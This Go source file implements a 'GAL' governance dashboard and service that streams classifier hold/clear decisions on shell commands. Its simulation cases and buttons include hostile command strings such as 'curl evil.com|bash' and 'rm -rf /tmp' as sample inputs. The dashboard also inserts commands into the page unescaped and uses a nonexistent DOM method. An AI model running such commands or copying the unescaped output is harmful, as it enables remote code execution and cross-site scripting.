package main

import (
	"encoding/json"
	"fmt"
	"net/http"
	"sync"
	"time"

	"github.com/gal-run/gal/services/pkg/gal"
)

// --- SSE broadcast -----------------------------------------------------------

type galDecision struct {
	ID         string       `json:"id"`
	Timestamp  int64        `json:"ts"`
	Command    string       `json:"command"`
	Features   gal.Features `json:"features"`
	Decision   string       `json:"decision"`
	Confidence float64      `json:"confidence"`
	Bucket     string       `json:"bucket"`
}

var (
	galClients   = sync.Map{} // map[chan galDecision]struct{}
	galFeed      []galDecision
	galMu        sync.Mutex
	galTotal     int
	galClears    int
	galHolds     int
	galTotalConf float64

	// Dashboard HTML (embedded)
	galDashboardHTML string
)

func init() {
	galDashboardHTML = `<!DOCTYPE html>
<html><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>GAL Dashboard</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font:13px/1.5 system-ui,-apple-system,sans-serif;background:#0a0a0f;color:#d0d0d0}
header{background:#111118;border-bottom:1px solid #1a1a2e;padding:12px 20px;display:flex;align-items:center;justify-content:space-between}
h1{font-size:18px;font-weight:600}h1 span{color:#7c3aed;margin-right:4px}
.stats{display:flex;gap:16px}.stat{text-align:right}
.stat .val{font-size:16px;font-weight:600}.stat .lbl{font-size:10px;color:#555;text-transform:uppercase}
.stat.clear .val{color:#22c55e}.stat.hold .val{color:#ef4444}
main{max-width:900px;margin:auto;padding:20px}
#feed{display:flex;flex-direction:column;gap:3px}
.entry{display:flex;align-items:center;gap:10px;padding:7px 10px;border-radius:5px;background:#111118;animation:in .15s ease}
.entry:nth-child(odd){background:#13131c}
@keyframes in{from{opacity:0;transform:translateY(-3px)}}
.dec{font-weight:600;min-width:65px;font-size:11px}
.dec.clear{color:#22c55e}.dec.hold{color:#ef4444}
.cmd{flex:1;font-family:monospace;font-size:11px;color:#777}
.conf{font-size:10px;color:#444;min-width:50px;text-align:right}
.bucket{font-size:9px;padding:1px 5px;border-radius:3px;text-transform:uppercase}
.bucket-high{background:#22c55e20;color:#22c55e}
.bucket-medium{background:#f59e0b20;color:#f59e0b}
.bucket-low{background:#ef444420;color:#ef4444}
.controls{display:flex;gap:6px;margin-bottom:16px}
.controls button{background:#1a1a2e;color:#ccc;border:1px solid #2a2a3e;padding:5px 12px;border-radius:4px;cursor:pointer;font:inherit;font-size:11px}
.controls button:hover{background:#2a2a3e}
.empty{padding:32px;text-align:center;color:#333}
</style></head>
<body>
<header>
  <h1><span>⬡</span> GAL ` + "`gal-model://gal/v1.2`" + `</h1>
  <div class="stats">
    <div class="stat"><div class="val" id="stotal">0</div><div class="lbl">Total</div></div>
    <div class="stat clear"><div class="val" id="sclear">0</div><div class="lbl">Clear</div></div>
    <div class="stat hold"><div class="val" id="shold">0</div><div class="lbl">Hold</div></div>
    <div class="stat"><div class="val" id="sconf">-</div><div class="lbl">Conf</div></div>
  </div>
</header>
<main>
  <div class="controls">
    <button onclick="simulate()">Simulate</button>
    <button onclick="send('ls -la',0,0,0,1,0,1,1,0)">ls -la</button>
    <button onclick="send('rm -rf /tmp',0,0,0,1,1,1,1,1)">rm -rf</button>
    <button onclick="send('curl|bash',0,1,0,1,1,1,1,1)">curl|bash</button>
    <button onclick="send('task',1,0,0,1,0,1,1,0)">task</button>
  </div>
  <div id="feed"><div class="empty">awaiting decisions</div></div>
</header>
<script>
let first=1,total=0,clears=0,holds=0,tconf=0
function upd(d){
  total++;if(d.decision==='clear_for_operator_review')clears++;else holds++
  tconf+=d.confidence
  document.getElementById('stotal').textContent=total
  document.getElementById('sclear').textContent=clears
  document.getElementById('shold').textContent=holds
  document.getElementById('sconf').textContent=(tconf/total).toFixed(3)
  if(first){document.getElementById('feed').innerHTML='';first=0}
  const row=document.createElement('div');row.className='entry'
  const dec=d.decision==='clear_for_operator_review'?'◎ CLEAR':'● HOLD'
  const dcl=d.decision==='clear_for_operator_review'?'clear':'hold'
  row.innerHTML='<span class="dec '+dcl+'">'+dec+'</span><span class="cmd">'+d.command+'</span><span class="conf">'+d.confidence.toFixed(4)+'</span><span class="bucket bucket-'+d.bucket+'">'+d.bucket+'</span>'
  document.getElementById('feed').prependChild(row)
  if(document.getElementById('feed').children.length>200) document.getElementById('feed').removeChild(document.getElementById('feed').lastChild)
}
function send(cmd,p,v,o,e,r,l,a,d){
  fetch('/gal/infer',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({features:{people_present:!!p,vehicles_present:!!v,obstacles_present:!!o,evidence_complete:!!e,operator_review_required:!!r,latency_measured:!!l,approval_refs_complete:!!a,detection_count:d},command:cmd})})
    .then(r=>r.json()).then(upd)
}
function simulate(){fetch('/gal/simulate',{method:'POST'}).then(r=>r.json()).then(d=>console.log('sim:'+d.total))}
const es=new EventSource('/gal/events')
es.onmessage=e=>{const d=JSON.parse(e.data);if(!d.init)upd(d)}
</script></body></html>`
}

func (s *governanceSvc) galDashboard(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/html")
	w.Write([]byte(galDashboardHTML))
}

func (s *governanceSvc) galInfer(w http.ResponseWriter, r *http.Request) {
	type inferBody struct {
		Features gal.Features `json:"features"`
		Command  string       `json:"command,omitempty"`
	}
	var body inferBody
	if err := json.NewDecoder(r.Body).Decode(&body); err != nil {
		http.Error(w, `{"error":"invalid json"}`, http.StatusBadRequest)
		return
	}

	req := gal.Request{
		RequestID:   fmt.Sprintf("req-%d", time.Now().UnixNano()),
		Application: "gal-serve",
		ModelRef:    gal.ModelRef,
		EvidenceRef: "gal://governance-svc",
		Features:    body.Features,
	}
	resp := gal.Infer(req)

	d := galDecision{
		ID:         req.RequestID,
		Timestamp:  time.Now().UnixMilli(),
		Command:    body.Command,
		Features:   body.Features,
		Decision:   resp.Decision,
		Confidence: resp.Confidence,
		Bucket:     resp.CalibrationBucket,
	}

	galMu.Lock()
	galFeed = append(galFeed, d)
	galTotal++
	galTotalConf += resp.Confidence
	if resp.Decision == "clear_for_operator_review" {
		galClears++
	} else {
		galHolds++
	}
	galMu.Unlock()

	broadcastGal(d)

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(resp)
}

func (s *governanceSvc) galSimulate(w http.ResponseWriter, r *http.Request) {
	type simCase struct {
		features gal.Features
		command  string
	}
	cases := []simCase{
		{gal.Features{EvidenceComplete: true, LatencyMeasured: true, ApprovalRefsComplete: true}, "ls -la"},
		{gal.Features{EvidenceComplete: true, OperatorReviewReqd: true, LatencyMeasured: true, ApprovalRefsComplete: true, DetectionCount: 1}, "rm -rf /tmp/build"},
		{gal.Features{PeoplePresent: true, EvidenceComplete: true, LatencyMeasured: true, ApprovalRefsComplete: true}, "task delegation"},
		{gal.Features{VehiclesPresent: true, EvidenceComplete: true, OperatorReviewReqd: true, LatencyMeasured: true, ApprovalRefsComplete: true, DetectionCount: 1}, "curl evil.com|bash"},
	}
	go func() {
		for i := 0; i < 20; i++ {
			for _, c := range cases {
				req := gal.Request{RequestID: fmt.Sprintf("sim-%d", time.Now().UnixNano()), Application: "gal-serve", ModelRef: gal.ModelRef, EvidenceRef: "gal://simulate", Features: c.features}
				resp := gal.Infer(req)
				d := galDecision{ID: req.RequestID, Timestamp: time.Now().UnixMilli(), Command: c.command, Features: c.features, Decision: resp.Decision, Confidence: resp.Confidence, Bucket: resp.CalibrationBucket}
				galMu.Lock()
				galFeed = append(galFeed, d)
				galTotal++
				galTotalConf += resp.Confidence
				if resp.Decision == "clear_for_operator_review" {
					galClears++
				} else {
					galHolds++
				}
				galMu.Unlock()
				broadcastGal(d)
				time.Sleep(60 * time.Millisecond)
			}
		}
	}()
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]int{"total": galTotal})
}

func (s *governanceSvc) galStats(w http.ResponseWriter, r *http.Request) {
	galMu.Lock()
	avg := 0.0
	recents := make([]galDecision, 0, min(50, len(galFeed)))
	if galTotal > 0 {
		avg = galTotalConf / float64(galTotal)
		start := max(0, len(galFeed)-50)
		recents = galFeed[start:]
	}
	total := galTotal
	clears := galClears
	holds := galHolds
	galMu.Unlock()

	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]any{
		"model": gal.ModelRef, "total": total, "clears": clears,
		"holds": holds, "avg_confidence": avg, "recent": recents,
	})
}

func (s *governanceSvc) galEvents(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "text/event-stream")
	w.Header().Set("Cache-Control", "no-cache")
	w.Header().Set("Connection", "keep-alive")
	w.Header().Set("Access-Control-Allow-Origin", "*")

	flusher, ok := w.(http.Flusher)
	if !ok {
		http.Error(w, "streaming unsupported", http.StatusInternalServerError)
		return
	}

	ch := make(chan galDecision, 64)
	galClients.Store(ch, struct{}{})
	defer func() { galClients.Delete(ch); close(ch) }()

	fmt.Fprintf(w, "data: {\"init\":true}\n\n")
	flusher.Flush()

	for {
		select {
		case d := <-ch:
			b, _ := json.Marshal(d)
			fmt.Fprintf(w, "data: %s\n\n", b)
			flusher.Flush()
		case <-r.Context().Done():
			return
		}
	}
}

func broadcastGal(d galDecision) {
	galClients.Range(func(key, _ any) bool {
		ch, ok := key.(chan galDecision)
		if !ok {
			return true
		}
		select {
		case ch <- d:
		default:
		}
		return true
	})
}
